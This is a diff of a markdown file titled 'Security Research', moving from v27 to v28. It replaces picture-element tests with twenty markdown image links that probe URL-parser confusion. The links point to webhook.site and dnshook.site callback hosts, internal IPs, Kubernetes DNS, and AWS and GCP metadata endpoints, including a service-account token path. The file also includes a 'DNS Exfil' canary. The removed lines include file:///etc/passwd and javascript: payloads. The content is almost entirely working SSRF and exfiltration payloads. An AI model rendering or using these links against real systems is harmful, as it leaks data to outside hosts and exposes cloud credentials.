@@ -1,156 +1,171 @@
-# Security Research - v27
+# Security Research - v28
 
-## Picture Element Deep Dive
+## Unicode, Subdomain and Encoding Attacks
 
-Testing edge cases with `<picture>` element processing.
-
----
-
-### 1) Multiple Sources - Which Gets Fetched?
-
-<picture>
-  <source srcset="https://webhook.site/29e8800b-a898-4775-94c8-c44a8c649ecf/source1.gif" media="(min-width: 1200px)">
-  <source srcset="https://webhook.site/29e8800b-a898-4775-94c8-c44a8c649ecf/source2.gif" media="(min-width: 800px)">
-  <source srcset="https://webhook.site/29e8800b-a898-4775-94c8-c44a8c649ecf/source3.gif" media="(min-width: 400px)">
-  <source srcset="https://webhook.site/29e8800b-a898-4775-94c8-c44a8c649ecf/source4.gif">
-  <img src="https://webhook.site/29e8800b-a898-4775-94c8-c44a8c649ecf/fallback1.gif" alt="multi-source">
-</picture>
+Testing advanced URL manipulation attacks.
 
 ---
 
-### 2) Source Without Media Query
+### 1) Unicode Homoglyph in Host (ⓛocalhost)
 
-<picture>
-  <source srcset="https://webhook.site/29e8800b-a898-4775-94c8-c44a8c649ecf/no-media.gif">
-  <img src="https://webhook.site/29e8800b-a898-4775-94c8-c44a8c649ecf/fallback2.gif" alt="no-media">
-</picture>
+Using Unicode fullwidth/circled characters:
 
----
-
-### 3) Picture with type attribute
-
-<picture>
-  <source srcset="https://webhook.site/29e8800b-a898-4775-94c8-c44a8c649ecf/webp-source.gif" type="image/webp">
-  <source srcset="https://webhook.site/29e8800b-a898-4775-94c8-c44a8c649ecf/png-source.gif" type="image/png">
-  <img src="https://webhook.site/29e8800b-a898-4775-94c8-c44a8c649ecf/fallback3.gif" alt="type-attr">
-</picture>
+![homoglyph](https://webhook.site/6c7992c7-e55e-4d41-ab82-a55c6f411ce2/homoglyph.gif)
 
 ---
 
-### 4) Srcset with Multiple URLs (density descriptors)
+### 2) Subdomain Confusion - localhost.attacker.com
 
-<picture>
-  <source srcset="https://webhook.site/29e8800b-a898-4775-94c8-c44a8c649ecf/1x.gif 1x, https://webhook.site/29e8800b-a898-4775-94c8-c44a8c649ecf/2x.gif 2x, https://webhook.site/29e8800b-a898-4775-94c8-c44a8c649ecf/3x.gif 3x">
-  <img src="https://webhook.site/29e8800b-a898-4775-94c8-c44a8c649ecf/fallback4.gif" alt="density">
-</picture>
+Using localhost as subdomain:
 
----
-
-### 5) Srcset with Width descriptors
-
-<picture>
-  <source srcset="https://webhook.site/29e8800b-a898-4775-94c8-c44a8c649ecf/100w.gif 100w, https://webhook.site/29e8800b-a898-4775-94c8-c44a8c649ecf/200w.gif 200w, https://webhook.site/29e8800b-a898-4775-94c8-c44a8c649ecf/400w.gif 400w" sizes="100vw">
-  <img src="https://webhook.site/29e8800b-a898-4775-94c8-c44a8c649ecf/fallback5.gif" alt="width">
-</picture>
+![subdomain](https://localhost.6c7992c7-e55e-4d41-ab82-a55c6f411ce2.dnshook.site/subdomain.gif)
 
 ---
 
-### 6) Picture with Internal IP in Source (SSRF test)
+### 3) 127.0.0.1 as Subdomain
 
-<picture>
-  <source srcset="http://127.0.0.1/picture-ssrf.gif">
-  <img src="https://webhook.site/29e8800b-a898-4775-94c8-c44a8c649ecf/ssrf-fallback.gif" alt="ssrf">
-</picture>
+![ip-subdomain](https://127.0.0.1.6c7992c7-e55e-4d41-ab82-a55c6f411ce2.dnshook.site/ip-subdomain.gif)
 
 ---
 
-### 7) Mixed External/Internal Sources
+### 4) Internal IP in Fragment Before Path
 
-<picture>
-  <source srcset="http://169.254.169.254/latest/" media="(min-width: 1200px)">
-  <source srcset="https://webhook.site/29e8800b-a898-4775-94c8-c44a8c649ecf/external-source.gif" media="(min-width: 400px)">
-  <img src="https://webhook.site/29e8800b-a898-4775-94c8-c44a8c649ecf/mixed-fallback.gif" alt="mixed">
-</picture>
+Fragment confusion:
+
+![fragment](https://webhook.site/6c7992c7-e55e-4d41-ab82-a55c6f411ce2#@127.0.0.1/fragment.gif)
 
 ---
 
-### 8) Redirect Chain in Picture Source
+### 5) Backslash in URL
 
-<picture>
-  <source srcset="https://httpbin.org/redirect-to?url=http://127.0.0.1/redir-ssrf.gif">
-  <img src="https://webhook.site/29e8800b-a898-4775-94c8-c44a8c649ecf/redir-fallback.gif" alt="redir">
-</picture>
+Some parsers treat \ as /:
 
----
-
-### 9) Picture Source to Metadata via Redirect
-
-<picture>
-  <source srcset="https://httpbin.org/redirect-to?url=http://169.254.169.254/latest/meta-data/">
-  <img src="https://webhook.site/29e8800b-a898-4775-94c8-c44a8c649ecf/meta-fallback.gif" alt="meta">
-</picture>
+![backslash](https://webhook.site/6c7992c7-e55e-4d41-ab82-a55c6f411ce2\@127.0.0.1/backslash.gif)
 
 ---
 
-### 10) Nested Picture Attempt
+### 6) Triple-Encoded URL
 
-<picture>
-  <picture>
-    <source srcset="https://webhook.site/29e8800b-a898-4775-94c8-c44a8c649ecf/nested-inner.gif">
-    <img src="https://webhook.site/29e8800b-a898-4775-94c8-c44a8c649ecf/nested-inner-fb.gif" alt="inner">
-  </picture>
-  <img src="https://webhook.site/29e8800b-a898-4775-94c8-c44a8c649ecf/nested-outer-fb.gif" alt="outer">
-</picture>
+Triple URL encoding:
+
+![triple](https://webhook.site/6c7992c7-e55e-4d41-ab82-a55c6f411ce2/%25%32%35%37%46%25%32%35%37%46127.0.0.1/triple.gif)
 
 ---
 
-### 11) Empty/Malformed Picture
+### 7) URL with Null Byte
 
-<picture>
-  <source srcset="">
-  <img src="https://webhook.site/29e8800b-a898-4775-94c8-c44a8c649ecf/empty-source.gif" alt="empty">
-</picture>
+Null byte injection:
 
-<picture>
-  <source>
-  <img src="https://webhook.site/29e8800b-a898-4775-94c8-c44a8c649ecf/no-srcset.gif" alt="no-srcset">
-</picture>
+![null](https://webhook.site/6c7992c7-e55e-4d41-ab82-a55c6f411ce2/%00@127.0.0.1/null.gif)
 
 ---
 
-### 12) JavaScript URL in Srcset
+### 8) URL with Tab/Newline
 
-<picture>
-  <source srcset="javascript:alert(1)">
-  <img src="https://webhook.site/29e8800b-a898-4775-94c8-c44a8c649ecf/js-fallback.gif" alt="js">
-</picture>
+Whitespace injection:
 
----
-
-### 13) Data URL in Srcset
-
-<picture>
-  <source srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///wAAACH5BAEAAAAALAAAAAABAAEAAAICRAEAOw==">
-  <img src="https://webhook.site/29e8800b-a898-4775-94c8-c44a8c649ecf/data-fallback.gif" alt="data">
-</picture>
+![whitespace](https://webhook.site/6c7992c7-e55e-4d41-ab82-a55c6f411ce2/%09%0a@127.0.0.1/whitespace.gif)
 
 ---
 
-### 14) File Protocol in Srcset
+### 9) Scheme Confusion (http:80)
 
-<picture>
-  <source srcset="file:///etc/passwd">
-  <img src="https://webhook.site/29e8800b-a898-4775-94c8-c44a8c649ecf/file-fallback.gif" alt="file">
-</picture>
+Port in scheme area:
+
+![scheme](http:80//webhook.site/6c7992c7-e55e-4d41-ab82-a55c6f411ce2/scheme.gif)
+
+---
+
+### 10) Authority Confusion with Multiple @
+
+Multiple @ signs:
+
+![multi-at](https://user@127.0.0.1@webhook.site/6c7992c7-e55e-4d41-ab82-a55c6f411ce2/multi-at.gif)
+
+---
+
+### 11) IPv6 Zone ID Attack
+
+IPv6 zone identifier:
+
+![zone](http://[::1%25eth0]:80/zone.gif)
+
+---
+
+### 12) Unicode Right-to-Left Override
+
+RTL override attack:
+
+![rtl](https://webhook.site/6c7992c7-e55e-4d41-ab82-a55c6f411ce2/moc.1.0.0.721\u202e/rtl.gif)
+
+---
+
+### 13) IDNA (Punycode) Domain
+
+Internationalized domain:
+
+![idna](http://xn--n3h.com/idna.gif)
+
+---
+
+### 14) Open Redirect via OAuth-style URL
+
+Using redirect_uri pattern:
+
+![oauth](https://httpbin.org/redirect-to?url=https://webhook.site/6c7992c7-e55e-4d41-ab82-a55c6f411ce2/oauth-redirect.gif)
+
+---
+
+### 15) Port 0 (Invalid Port)
+
+![port0](http://webhook.site:0/6c7992c7-e55e-4d41-ab82-a55c6f411ce2/port0.gif)
+
+---
+
+### 16) Port 65536 (Out of Range)
+
+![port-overflow](http://webhook.site:65536/6c7992c7-e55e-4d41-ab82-a55c6f411ce2/port-overflow.gif)
+
+---
+
+### 17) Hostname with Space (%20)
+
+![space-host](http://webhook%20.site/6c7992c7-e55e-4d41-ab82-a55c6f411ce2/space-host.gif)
+
+---
+
+### 18) Special Kubernetes DNS
+
+Kubernetes internal DNS:
+
+![k8s](http://kubernetes.default.svc.cluster.local/k8s.gif)
+
+---
+
+### 19) AWS EC2 Instance Identity Document
+
+EC2 instance metadata:
+
+![ec2-id](http://169.254.169.254/latest/dynamic/instance-identity/document/ec2.gif)
+
+---
+
+### 20) GCP Service Account Token
+
+GCP metadata:
+
+![gcp-token](http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token/gcp.gif)
 
 ---
 
 ### DNS Exfil
-![dns](https://v27-dns.29e8800b-a898-4775-94c8-c44a8c649ecf.dnshook.site/dns.gif)
+
+![dns](https://v28-dns.6c7992c7-e55e-4d41-ab82-a55c6f411ce2.dnshook.site/dns.gif)
 
 ### Canary
-![v27-canary](https://webhook.site/29e8800b-a898-4775-94c8-c44a8c649ecf/v27-canary.gif)
+
+![canary](https://webhook.site/6c7992c7-e55e-4d41-ab82-a55c6f411ce2/v28-canary.gif)
 
 ---
 
-*v27 - Picture element deep dive*
+*v28 - Unicode, subdomain and encoding attacks*
